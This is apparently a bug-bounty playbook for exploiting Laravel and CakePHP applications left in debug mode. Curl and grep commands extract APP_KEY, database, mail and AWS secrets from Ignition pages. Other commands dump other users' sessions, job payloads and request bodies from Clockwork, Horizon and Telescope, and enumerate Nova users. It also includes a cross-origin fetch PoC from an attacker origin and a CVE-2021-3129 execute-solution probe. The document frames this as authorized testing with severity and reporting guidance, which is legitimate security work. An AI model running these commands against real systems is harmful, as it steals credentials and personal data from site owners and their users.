---
type: playbook
title: "Laravel and PHP Framework Debug Attack Chain (Multi-Tool Variant)"
tags: [laravel, php-framework, cakephp, debug-tools-in-production, pii-leak, info-leak]
status: draft
last_updated: 2026-08-12
category: hunting
estimated_time: "45-90 min"
---

# Playbook - Laravel and PHP Framework Debug Attack Chain (Multi-Tool Variant)

> **TL;DR**: `APP_DEBUG=true` left on in production is not itself "a vulnerability" — it's a multiplier that unlocks a family of debug tools (Ignition/Whoops, Clockwork, Horizon, Telescope), each with a different PII/credential exposure profile. This playbook turns detection, exploitation, severity grading, and stop-loss decisions into concrete, repeatable steps against a Laravel-based target application, and includes a CakePHP variant of the same root cause.

## Scope / When to use

Use this playbook whenever a PHP-framework target (Laravel or CakePHP) is in scope and you suspect the framework's debug/diagnostic mode is enabled in production — e.g. unusually large (>100KB) 404/500 responses, stack-trace-looking HTML, or an exposed developer dashboard path. It complements a companion technique note that documents the base detection signals and severity table for this root cause (see Related) by adding step-by-step commands, a login-flow stack-trace variant, the CakePHP equivalent, and a stop-loss decision tree for the Ignition RCE path.

## Phases

### Phase 1: Confirm APP_DEBUG and trigger the Ignition/Whoops page

Goal: verify debug mode is genuinely enabled and capture the Ignition/Whoops page as root-cause evidence.

```bash
TARGET="https://target.example.com"

# Method A: hit a nonexistent route to trigger a 404/Ignition page
curl -si "${TARGET}/nonexistent-$(date +%s)" -o /tmp/debug_resp.html
wc -c /tmp/debug_resp.html
# >100KB HTML == Ignition or Whoops stack trace, near-certain confirmation

# Method B: check response Content-Type and keywords
curl -si "${TARGET}/nonexistent-$(date +%s)" | grep -i "ignition\|whoops\|laravel\|flare"

# Method C: parse the JSON-flavored Ignition response (modern versions)
curl -si "${TARGET}/nonexistent-$(date +%s)" -H "Accept: application/json" | head -50
# JSON responses include "exception", "file", "line", "trace" fields

# Extract sensitive env vars from the debug page
grep -oP '(?<=APP_KEY["\s:=>]+)[A-Za-z0-9+/=]{20,}' /tmp/debug_resp.html
grep -oP '(?<=DB_PASSWORD["\s:=>]+)[^\s"<]{3,}' /tmp/debug_resp.html
grep -oP '(?<=MAIL_PASSWORD["\s:=>]+)[^\s"<]{3,}' /tmp/debug_resp.html
grep -oP '(?<=AWS_SECRET[_A-Z]*["\s:=>]+)[A-Za-z0-9/+]{20,}' /tmp/debug_resp.html
```

Verdict:
- Body >100KB and contains `class Ignition` or the `Whoops\` namespace → APP_DEBUG confirmed.
- Contains `APP_KEY=base64:...` → escalate to Critical (see Phase 8).
- A normal 404 JSON response (<1KB) → debug mode is off, stop here.

### Phase 2: Check `/__clockwork/` — request history and credential leakage

Goal: determine whether Clockwork exposes other users' request records (session tokens, DB queries, URL params).

```bash
# Confirm the endpoint is enabled
curl -si "${TARGET}/__clockwork" | head -5
curl -si "${TARGET}/__clockwork/requests" | head -5
# 200 + JSON == Clockwork is open

# Pull the last 50 requests' metadata
curl -s "${TARGET}/__clockwork/requests?limit=50" | jq '.data[] | {id, method, uri, time, authenticated}'

# Pull the full record for a request ID (session, cookies, DB queries)
REQUEST_ID="<from previous step>"
curl -s "${TARGET}/__clockwork/${REQUEST_ID}" | jq '{
  session: .session,
  cookies: .cookies,
  database_queries: .databaseQueries,
  auth: .auth,
  headers: .headers
}'

# Identify whether Clockwork is enabled via response headers (no need to hit /__clockwork directly)
curl -si "${TARGET}/" | grep -i "x-clockwork"
# Presence of X-Clockwork-Id == Clockwork enabled on this page

# Fetch the matching request detail
CLOCKWORK_ID=$(curl -si "${TARGET}/" | grep -i "x-clockwork-id" | awk '{print $2}' | tr -d '\r')
curl -s "${TARGET}/__clockwork/${CLOCKWORK_ID}" | jq '{session: .session, auth: .auth}'
```

Verdict:
- Session contains `_token` (CSRF) or `user_id` → P3 (request history + identity).
- Contains another logged-in user's reusable session token → P2 (account takeover potential).
- Only URL + timestamp → P4 (low-sensitivity request log).

### Phase 3: Check `/horizon` — job payload PII (highest PII severity)

Goal: the Horizon dashboard leaks real PII (email, phone, case IDs, transaction data) from the job queue payloads.

```bash
# Confirm Horizon is open
curl -si "${TARGET}/horizon" | head -5
curl -si "${TARGET}/horizon/api/jobs/recent" | head -10
# 200 + JSON == unauthenticated Horizon dashboard

# Extract recent jobs (pending/recent carry the full payload)
curl -s "${TARGET}/horizon/api/jobs/pending" | jq '.jobs[] | {id, displayName, payload}'

# Failed jobs usually retain the richest PII (payload preserved intact)
curl -s "${TARGET}/horizon/api/jobs/failed" | jq '.jobs[] | {
  displayName,
  payload: (.payload | fromjson? // .payload)
}'

# Confirm system scale (for impact assessment)
curl -s "${TARGET}/horizon/api/metrics/jobs" | jq '{totalProcessed: .throughput}'

# Extract all email/phone patterns
curl -s "${TARGET}/horizon/api/jobs/recent" | jq -r '.jobs[].payload' | \
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
```

Verdict:
- Payload contains real user email/phone → P2 High (production PII leak).
- Payload contains transaction IDs / case IDs / amounts → P2 High.
- Payload contains API tokens/secrets → P1-P2 Critical/High.

### Phase 4: Check `/telescope` — full request/response history

Goal: Telescope is a more complete debugging tool that persists full HTTP request/response/exception records.

```bash
# Confirm Telescope is open
curl -si "${TARGET}/telescope" | head -5
curl -si "${TARGET}/telescope/telescope-api/requests" | head -10

# Recent request list
curl -s "${TARGET}/telescope/telescope-api/requests" | jq '.entries[] | {id, content: {method: .content.method, uri: .content.uri, status: .content.status}}'

# Full record for a single request (request body, response body, headers)
ENTRY_ID="<from previous step>"
curl -s "${TARGET}/telescope/telescope-api/requests/${ENTRY_ID}" | jq '.entry.content | {
  payload: .payload,
  response: .response,
  headers: .headers,
  session: .session
}'

# Exception records (with stack trace + env)
curl -s "${TARGET}/telescope/telescope-api/exceptions" | jq '.entries[] | {id, type: .content.class, message: .content.message}'
```

Verdict:
- Contains another user's POST body (with password/token) → P1-P2.
- Contains response body exposing another user's data → P2 (IDOR-equivalent impact).
- Only metadata (method/URI/status) → P3-P4.

### Phase 5: Check admin panel exposure — `/nova`, `/admin`, `/dashboard`

Goal: confirm whether Laravel Nova or a custom admin interface is exposed unauthenticated or with weak authentication.

```bash
# Common Laravel admin paths
for path in /nova /nova/login /admin /admin/login /dashboard /manager /backpack /filament; do
  STATUS=$(curl -si "${TARGET}${path}" | head -1 | awk '{print $2}')
  echo "${path} -> ${STATUS}"
done

# Confirm Nova via fingerprint markers
curl -si "${TARGET}/nova" | grep -i "nova\|laravel nova"
curl -si "${TARGET}/nova/api/users" | jq 'length'  # 200 + JSON == unauthorized user enumeration

# Confirm whether admin resources are directly accessible
curl -si "${TARGET}/nova/api/resources/users" | head -20
```

Verdict:
- Nova `/api/resources/users` returns 200 + a user list → P2 (user enumeration + PII).
- Admin login page is visible but requires auth → do not report (default behavior; fails the three-question filter, see Decision Points).
- Admin interface returns 200 with working functionality → needs further testing to determine whether actions can be performed.

### Phase 6: Login error stack trace — PII in frame arguments

Goal: some Laravel versions leak the request payload (containing other users' data or DB query results) in the frame arguments of the Ignition stack trace shown on a failed login.

```bash
# Trigger a login error (use a nonexistent account, observe whether the
# stack trace exposes query results or session data)
curl -si -X POST "${TARGET}/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"trigger-debug-test-$(date +%s)@example.com","password":"wrongpassword"}' \
  -o /tmp/login_trace.html

wc -c /tmp/login_trace.html   # >50KB == has a stack trace

# Extract frame args from the trace (may contain real user data from DB queries)
grep -oP '"args":\s*\[[^\]]{20,}\]' /tmp/login_trace.html | head -5

# Extract database queries (may reveal other users' information)
grep -oP '"select \* from[^"]{10,}"' /tmp/login_trace.html | head -5
```

Stop-loss verdict:
- Frame args only contain method names and scalar values → P4 low (pure path disclosure).
- Frame args contain ORM query results (other users' objects) → P2-P3 (PII leak escalation).
- Frame args contain a plaintext `$password` → P2 High (credential leak).

### Phase 7: CakePHP variant

CakePHP debug mode (`Configure::write('debug', true)`) behaves differently from Laravel: every 404/500 returns an HTML stack trace containing:

- **Framework version** (CakePHP x.y.z — directly queryable against CVE databases)
- **Absolute file paths** (`/var/www/html/src/Controller/...`)
- **PHP version** (also CVE-queryable)
- **SQL queries** (on ORM errors)

```bash
TARGET="https://target.example.com"

# Trigger a CakePHP debug stack trace
curl -si "${TARGET}/nonexistent-route-$(date +%s)" | head -5

# Confirm CakePHP fingerprint
curl -si "${TARGET}/nonexistent-$(date +%s)" | grep -i "cakephp\|cake-version\|CakeRequest"

# Extract the version number (for CVE lookup)
curl -s "${TARGET}/nonexistent-$(date +%s)" | \
  grep -oP 'CakePHP v?\d+\.\d+\.\d+' | head -3

# Extract absolute paths
curl -s "${TARGET}/nonexistent-$(date +%s)" | \
  grep -oP '/(var|home|srv|app|www)[/a-zA-Z0-9._-]{10,}\.php' | sort -u | head -10
```

**CakePHP + CORS `*` combination**

When a target has both:
1. CakePHP debug mode → path disclosure (including URLs carrying sensitive information)
2. `Access-Control-Allow-Origin: *`

An attacker can read the stack trace content cross-origin from any web page (full path disclosure), forming an exploitable CORS + info-disclosure chain:

```bash
# Confirm CORS configuration
curl -si "${TARGET}/nonexistent-$(date +%s)" \
  -H "Origin: https://attacker.example.com" | grep -i "access-control"

# If ACAO: * -> the trace is readable from any origin
# PoC JavaScript (run from an attacker-controlled page):
# fetch('https://target.example.com/nonexistent').then(r=>r.text()).then(t=>console.log(t))
```

Severity adjustment: CORS `*` + CakePHP debug trace escalates from P4 (pure path leak) to P3 (cross-origin exploitable). But if the trace contains only framework paths (no PII/credentials), most programs still treat it as Low.

### Phase 8: Severity grading (validated ranking) and detection heuristics

**PII severity ranking**

```
1. Horizon job payload (highest)
   - Contains: real user email / phone / case ID / transaction amount
   - Why more severe: the queue retains full job parameters, not just a request log
   - Typical severity: P2 High

2. Telescope request/response (second highest)
   - Contains: full POST body (including password fields) + response body
   - Typical severity: P2 High (depends on whether sensitive payload is present)

3. Clockwork session data
   - Contains: session token / authenticated user ID / CSRF token
   - Typical severity: P2-P3

4. Clockwork request log (basic)
   - Contains: URL params / query string
   - Typical severity: P3-P4

5. Pure stack trace (no PII)
   - Contains: file paths / class names / Laravel version
   - Typical severity: P4-P5
```

**405/500 large-response heuristic for detecting debug pages**

```bash
# A large 405 Method Not Allowed response often indicates a debug page, not a plain error
BODY_SIZE=$(curl -si -X POST "${TARGET}/api/some-get-endpoint" | wc -c)
if [ "$BODY_SIZE" -gt 102400 ]; then
  echo "DEBUG PAGE LIKELY -- inspect response"
fi

# Same heuristic for a 500 Internal Server Error
BODY_SIZE=$(curl -si "${TARGET}/trigger-500-nonexistent" | wc -c)
if [ "$BODY_SIZE" -gt 102400 ]; then
  echo "DEBUG PAGE LIKELY (Ignition/Whoops)"
fi
```

Rule of thumb: any 4xx/5xx response over 100KB is almost certainly an Ignition or Whoops debug page — go straight to Phase 1.

**APP_KEY leak severity escalation**

If the stack trace includes an `APP_KEY` (base64 AES key):

```bash
# Extract the APP_KEY
grep -oP 'base64:[A-Za-z0-9+/=]{40,}' /tmp/debug_page.html | head -3

# An APP_KEY can be used to:
# 1. Forge a Laravel session cookie (account takeover)
# 2. Decrypt encrypted cookies (PII leak)
# 3. Trigger unserialize-based RCE on some vulnerable versions
# Tooling: https://github.com/ambionics/laravel-exploits (authorized testing only)
```

### Phase 9: Ignition TCP-IP check bypass — impossible (stop-loss basis)

**`ensureLocalRequest()` mechanism**

Ignition's `/_ignition/execute-solution` endpoint (the exploitation path for CVE-2021-3129) calls `ensureLocalRequest()` before executing a solution:

- This method reads the **TCP-layer connection IP** as passed by nginx/php-fpm.
- It does **not** read any HTTP header (`X-Forwarded-For` / `X-Real-IP` / `Forwarded` are all ineffective).
- It is unaffected by `TrustProxies` middleware settings, because `TrustProxies` operates at the application layer while `ensureLocalRequest()` operates at the Ignition layer.

**Stop-loss decision tree**

```
Is your request coming from outside the target's network?
|-- YES -> TCP IP != 127.0.0.1 -> blocked by ensureLocalRequest()
|          -> CVE-2021-3129 RCE is NOT exploitable
|          -> downgrade the report: stack trace + env leak only (if present)
|
`-- NO (you're on the target host, or SSRF reaches localhost)
    |-- debug=true + Ignition < 2.5.2 -> CVE-2021-3129 potential RCE
    `-- debug=true + Ignition >= 2.5.2 -> already patched, env leak only
```

Common misconceptions:
- `X-Forwarded-For: 127.0.0.1` → **has no effect**.
- Finding a reverse proxy IP + rewriting the Host header → **has no effect** (the TCP IP is still your egress IP).
- Firing a CVE-2021-3129 PoC directly at an internet-facing endpoint → **403 from ensureLocalRequest**.

```bash
# Confirm ensureLocalRequest is blocking the request:
curl -si -X POST "${TARGET}/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d '{"solution":"Facade\\Ignition\\Solutions\\GenerateMissingAppKey","parameters":{}}' | head -5
# 403 == blocked (TCP IP check)
# 200 == exploitable (target is misconfigured, or you're on an internal network)
```

## Decision Points

**Three-question test (must pass before submission)**

| Question | If the answer is NO, stop-loss applies |
|---|---|
| What can the attacker actually obtain? Name the concrete data type. | "Debug mode is on" isn't enough — state the specific PII/credential exposed. |
| Is this default behavior? | Laravel's production default is `APP_DEBUG=false`; having it on is an active misconfiguration, i.e. non-default. |
| What's left once the theoretical part is removed? | If Ignition RCE is blocked by the TCP IP check, all that remains is the stack trace leak — downgrade the report accordingly. |

**Split vs. merge reporting**

Report separately when each finding has a distinct endpoint, distinct root-cause classification (CWE), and distinct real-world impact:
- Ignition stack trace + env leak (CWE-215)
- Clockwork request history (CWE-532)
- Horizon PII (CWE-359)
- Telescope full log (CWE-532/359)

Must be merged when the root cause, endpoint, and impact type are identical:
- Multiple Clockwork PII fields → one report
- Multiple env variables leaked via the same stack trace → one report

Every split report must still state the shared root cause: "root cause is APP_DEBUG=true; this report covers the specific impact of [Clockwork/Horizon/Telescope]..."

**Quick-reference command block**

```bash
TARGET="https://target.example.com"

# Probe all debug tools at once (a few seconds)
for path in "/__clockwork" "/__clockwork/requests" "/horizon" "/horizon/api/jobs/recent" \
            "/telescope" "/telescope/telescope-api/requests" \
            "/_ignition/execute-solution" "/nova" "/nova/api/users"; do
  STATUS=$(curl -o /dev/null -s -w "%{http_code}" "${TARGET}${path}")
  SIZE=$(curl -s "${TARGET}${path}" | wc -c)
  echo "${STATUS} [${SIZE}B] ${path}"
done

# Trigger the debug page
curl -s "${TARGET}/nonexistent-$(date +%s)" -o /tmp/debug_$(date +%s).html
wc -c /tmp/debug_*.html
```

## Expected Outputs

- Confirmation of whether `APP_DEBUG`/CakePHP debug mode is enabled, with the triggering HTTP request/response saved as evidence.
- A per-tool exposure inventory (Clockwork / Horizon / Telescope / Nova) with severity assigned per Phase 8's ranking.
- A stop-loss determination on the Ignition RCE path (exploitable vs. env-leak-only), backed by the TCP-IP-check test in Phase 9.
- A split-vs-merge decision for however many findings the chain produced, each with a stated shared root cause.

## Related

- [[Pattern - Laravel Debug Chain]] — the base pattern this playbook extends (detection signals + severity table)
- [[Lessons Learned]]
